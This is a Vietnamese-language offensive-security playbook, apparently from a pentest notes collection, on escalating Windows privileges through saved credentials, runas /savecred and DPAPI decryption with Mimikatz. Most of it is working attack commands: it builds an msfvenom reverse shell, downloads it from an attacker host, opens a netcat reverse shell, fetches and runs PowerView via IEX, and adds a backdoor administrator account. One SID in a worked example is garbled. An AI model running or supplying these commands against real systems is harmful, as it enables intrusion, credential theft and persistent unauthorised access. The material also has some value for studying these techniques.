# Credential Manager and Windows Vault

## Điểm chính khai thác

* Khai thác thông tin xác thực lưu trữ (stored credentials) và lệnh `runas` để thực thi lệnh với đặc quyền cao hơn, tận dụng các thông tin xác thực đã lưu hoặc cấu hình sai trong Windows
* Lệnh `runas /savecred` cho phép thực thi chương trình với thông tin xác thực quản trị mà không cần nhập lại mật khẩu, nếu thông tin xác thực đã được lưu
* Các công cụ như `cmdkey` và `vaultcmd` giúp liệt kê và quản lý thông tin xác thực, trong khi Mimikatz (DPAPI) có thể giải mã mật khẩu từ các vault hoặc tệp thông tin xác thực
* Kiểm tra cấu hình LM/NTLM hashes trong registry giúp xác định khả năng khai thác thông tin xác thực cũ hoặc thực hiện tấn công pass-the-hash
* Kỹ thuật này hiệu quả trong môi trường Active Directory hoặc máy cục bộ nơi thông tin xác thực quản trị bị lưu trữ không an toàn hoặc shortcut sử dụng `runas` được cấu hình sai

## Các bước khai thác

### Kiểm tra lỗ hổng

#### Xác định mục tiêu tiềm năng

Liệt kê tất cả thông tin xác thực lưu trữ để tìm các tài khoản quản trị hoặc dịch vụ:

```
cmdkey /list
```

Output mong đợi: Danh sách thông tin xác thực, ví dụ: `Target: Domain:interactive=ACCESS\Administrator`

Liệt kê các vault lưu trữ thông tin xác thực để xác định dữ liệu nhạy cảm:

```
vaultcmd /list
```

Output mong đợi: Danh sách vault, ví dụ: `Web Credentials, Windows Credentials`

Liệt kê chi tiết các mục trong vault để tìm thông tin xác thực cụ thể:

```
vaultcmd /listcreds:"Web Credentials" /all
```

Output mong đợi: Chi tiết thông tin xác thực, ví dụ: `Username: admin, Password: [protected]`

Tìm kiếm các shortcut sử dụng `runas` để phát hiện các lệnh có thể khai thác:

```
Get-ChildItem "C:\\" *.lnk -Recurse -Force | ft fullname | Out-File shortcuts.txt
```

Output mong đợi: Tệp `shortcuts.txt` chứa đường dẫn các shortcut, ví dụ: `C:\Users\security\Desktop\admin.lnk`

Phân tích nội dung shortcut để tìm lệnh `runas`:

{% code overflow="wrap" %}

```
ForEach($file in gc .\\shortcuts.txt) { Write-Output $file; gc $file | Select-String runas }
```

{% endcode %}

Output mong đợi: Shortcut chứa `runas`, ví dụ: `runas /user:ACCESS\Administrator`

#### Kiểm tra quyền truy cập hoặc cấu hình

Kiểm tra quyền ghi trên thư mục tạm để lưu trữ payload hoặc công cụ:

```
icacls C:\Temp
```

Output mong đợi: Quyền thư mục, ví dụ: `BUILTIN\Users:(M)`

Kiểm tra cấu hình LM hashes để xác định khả năng khai thác thông tin xác thực cũ:

{% code overflow="wrap" %}

```
Get-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Lsa' -Name 'NoLMHash'
```

{% endcode %}

Output mong đợi: Giá trị bật, ví dụ: `NoLMHash REG_DWORD 0x1` (LM hashes bị tắt)

Kiểm tra mức độ tương thích Net-NTLM để xác định khả năng sử dụng NTLMv2:

{% code overflow="wrap" %}

```
Get-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -Name 'LMCompatibilityLevel'
```

{% endcode %}

Output mong đợi: Giá trị, ví dụ: `LMCompatibilityLevel REG_DWORD 0x5` (Net-NTLMv2 được bật)

#### Phân tích ngữ cảnh thực thi

Tìm kiếm các tệp DPAPI liên quan đến thông tin xác thực để trích xuất mật khẩu:

```
cmd /c "dir /S /AS C:\\Users\\security\\AppData\\Local\\Microsoft\\Vault & dir /S /AS C:\\Users\\security\\AppData\\Local\\Microsoft\\Credentials & dir /S /AS C:\\Users\\security\\AppData\\Local\\Microsoft\\Protect & dir /S /AS C:\\Users\\security\\AppData\\Roaming\\Microsoft\\Vault & dir /S /AS C:\\Users\\security\\AppData\\Roaming\\Microsoft\\Credentials & dir /S /AS C:\\Users\\security\\AppData\\Roaming\\Microsoft\\Protect"
```

Output mong đợi: Danh sách tệp, ví dụ: `C:\Users\security\AppData\Local\Microsoft\Credentials\7505A1CE4F953BF9CA27E7CD22747C7E`

### Thực thi khai thác

#### Chuẩn bị payload hoặc mã khai thác

Tạo payload reverse shell để sử dụng với `runas`:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<port> -f exe -o nc.exe
```

Ghi chú: Thay `<IP>` và `<port>` bằng IP và cổng attacker. Đảm bảo kiến trúc payload khớp hệ thống (x64 cho 64-bit).

Tải payload lên thư mục tạm trên mục tiêu:

```
iwr -Uri http://<IP>/nc.exe -OutFile C:\Temp\nc.exe
```

Ghi chú: Đảm bảo máy chủ HTTP chạy trên `<IP>`. Kiểm tra quyền ghi trên `C:\Temp` trước.

#### Áp dụng khai thác

Sử dụng `runas` để thực thi payload với thông tin xác thực quản trị:

```
runas /env /profile /user:Administrator "nc.exe -e powershell <IP> <port>"
```

Ghi chú: Thay `<IP>` và `<port>` bằng IP và cổng attacker. Đảm bảo listener chạy trước.

Sử dụng `runas /savecred` để thực thi lệnh PowerShell với thông tin xác thực đã lưu:

{% code overflow="wrap" %}

```
runas /user:ACCESS\\Administrator /savecred "powershell -c IEX (New-Object Net.Webclient).downloadstring('http://<IP>/PowerView.ps1')"
```

{% endcode %}

Ghi chú: Thay `<IP>` bằng IP attacker. Đảm bảo PowerView\.ps1 được lưu trữ trên máy chủ HTTP.

Thêm thông tin xác thực mới để sử dụng với `runas /savecred`:

```
cmdkey /add:MyServer /user:MyUser /pass:MyPassword
```

Output mong đợi: Thông tin xác thực được thêm, ví dụ: `Successfully added credential for MyServer`

Xóa thông tin xác thực để ngăn truy cập trái phép:

```
cmdkey /delete:MyServer
```

Output mong đợi: Thông tin xác thực bị xóa, ví dụ: `Credential deleted for MyServer`

Xóa thông tin xác thực tương tác của tài khoản cụ thể:

```
cmdkey /delete:Domain:interactive=WORKGROUP\\Administrator
```

Output mong đợi: Thông tin xác thực bị xóa, ví dụ: `Credential deleted for WORKGROUP\Administrator`

Trích xuất khóa chính DPAPI để giải mã thông tin xác thực:

```
mimikatz # dpapi::masterkey /in:3296853f-c42b-4ee0-a317-be49c5447823 /sid:S-1-5-21-1412805706-2265949842-2593025800-1001 /password:titan1506
```

Output mong đợi: Khóa chính được giải mã, ví dụ: `Masterkey: <key>`

Giải mã thông tin xác thực DPAPI từ tệp credential:

```
dpapi::cred /in:7505A1CE4F953BF9CA27E7CD22747C7E
```

Output mong đợi: Thông tin xác thực, ví dụ: `Username: admin, Password: secret123`

#### Kích hoạt khai thác

Thêm tài khoản quản trị để duy trì truy cập:

```
net user hacker hacker123 /add
```

Output mong đợi: Tài khoản được tạo, ví dụ: `The command completed successfully`

Thêm tài khoản vào nhóm Administrators:

```
net localgroup Administrators hacker /add
```

Output mong đợi: Tài khoản được thêm, ví dụ: `The command completed successfully`

Thêm tài khoản vào nhóm Remote Desktop Users:

```
net localgroup "Remote Desktop Users" hacker /add
```

Output mong đợi: Tài khoản được thêm, ví dụ: `The command completed successfully`

Chờ kết nối reverse shell:

```
nc -lvnp <port>
```

Output mong đợi: Kết nối từ mục tiêu, ví dụ: `Connection from 192.168.1.101:45678`

### Kiểm tra kết quả

Xác nhận quyền quản trị hoặc SYSTEM sau khai thác:

```
whoami
```

Output mong đợi: `nt authority\system` hoặc `domain\administrator`\
Xác nhận: Thử lệnh yêu cầu quyền cao, ví dụ: `net user hacker` để kiểm tra tài khoản đã thêm.

## Ví dụ khai thác

### Khai thác Runas với Stored Credentials

**Kịch bản mẫu**: Tài khoản người dùng trên Windows Server 2019 có thông tin xác thực quản trị lưu trữ cho `ACCESS\Administrator`, quyền ghi trên `C:\Temp`. Triển khai reverse shell với `runas /savecred`.\
**Output**:

```
cmdkey /list
Target: Domain:interactive=ACCESS\Administrator

icacls C:\Temp
BUILTIN\Users:(M)

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o nc.exe
iwr -Uri http://192.168.1.100/nc.exe -OutFile C:\Temp\nc.exe

runas /user:ACCESS\\Administrator /savecred "C:\Temp\nc.exe -e powershell 192.168.1.100 4444"

nc -lvnp 4444
Connection from 192.168.1.101:45678
whoami
access\administrator
```

### Khai thác DPAPI để Trích xuất Mật khẩu

**Kịch bản mẫu**: Tài khoản người dùng trên Windows 10 có quyền truy cập vào tệp DPAPI tại `C:\Users\security\AppData\Local\Microsoft\Credentials`, biết mật khẩu người dùng (`titan1506`). Sử dụng Mimikatz để giải mã thông tin xác thực.\
**Output**:

```
cmd /c "dir /S /AS C:\\Users\\security\\AppData\\Local\\Microsoft\\Credentials"
C:\Users\security\AppData\Local\Microsoft\Credentials\7505A1CE4F953BF9CA27E7CD22747C7E

mimikatz # dpapi::masterkey /in:3296853f-c42b-4ee0-a317-be49c5447823 /sid:S-1-5-21 primes1412805706-2265949842-2593025800-1001 /password:titan1506
Masterkey: <key>

dpapi::cred /in:7505A1CE4F953BF9CA27E7CD22747C7E
Username: admin
Password: secret123

net user hacker secret123 /add
net localgroup Administrators hacker /add
The command completed successfully
```

* Run as other user

  ```powershell
  runas /env /profile /user:Administrator "nc.exe -e powershel <IP> <port>"
  ```
* List out all stored credentials

  ```powershell
  cmdkey /list
  ```
* Add user account

  ```powershell
  net user hacker hacker123 /add
  net localgroup Administrators hacker /add
  net localgroup "Remote Desktop Users" hacker /ADD
  ```
* Add new credentials

  ```powershell
  cmdkey /add:MyServer /user:MyUser /pass:MyPassword
  ```
* Delete credentials

  ```powershell
  cmdkey /delete:MyServer
  cmdkey /delete:Domain:interactive=WORKGROUP\\Administrator
  ```
* Enumerate vaults

  ```powershell
  vaultcmd /list
  ```
* List entries saved in vault

  ```powershell
   vaultcmd /listcreds:"Web Credentials" /all
  ```
* DPAPI - Extracting Passwords

  * Search

  ```powershell
  cmd /c "dir /S /AS C:\\Users\\security\\AppData\\Local\\Microsoft\\Vault & dir /S /AS C:\\Users\\security\\AppData\\Local\\Microsoft\\Credentials & dir /S /AS C:\\Users\\security\\AppData\\Local\\Microsoft\\Protect & dir /S /AS C:\\Users\\security\\AppData\\Roaming\\Microsoft\\Vault & dir /S /AS C:\\Users\\security\\AppData\\Roaming\\Microsoft\\Credentials & dir /S /AS C:\\Users\\security\\AppData\\Roaming\\Microsoft\\Protect"
  ```

  * Copy Credential Protection and

  ```powershell
  mimikatz # dpapi::masterkey /in:3296853f-c42b-4ee0-a317-be49c5447823 /sid:S-1-5-21-1412805706-2265949842-2593025800-1001 /password:titan1506
  dpapi::cred /in:7505A1CE4F953BF9CA27E7CD22747C7E
  ```
* Runas /savecred
  * Searches for shortcuts that use the runas command

    ```powershell
    Get-ChildItem "C:\\" *.lnk -Recurse -Force | ft fullname | Out-File shortcuts.txt
    ForEach($file in gc .\\shortcuts.txt) { Write-Output $file; gc $file | Select-String runas }
    ```
  * Executes a PowerShell command as Administrator using saved credentials

    ```powershell
    runas /user:ACCESS\\Administrator /savecred "powershell -c IEX (New-Object Net.Webclient).downloadstring('<http://10.10.14.5/PowerView.ps1>)"
    ```
* Windows Hashes

  * Check if LM hashes are enabled

    ```powershell
    Get-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Lsa' -Name 'NoLMHash'
    ```
  * Check Net-NTLM compatibility. If the path does not exist, then Net-NTLMv2 is enabled.

  ```powershell
  Get-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -Name 'LMCompatibilityLevel'
  ```

<https://github.com/sailay1996/WerTrigger>
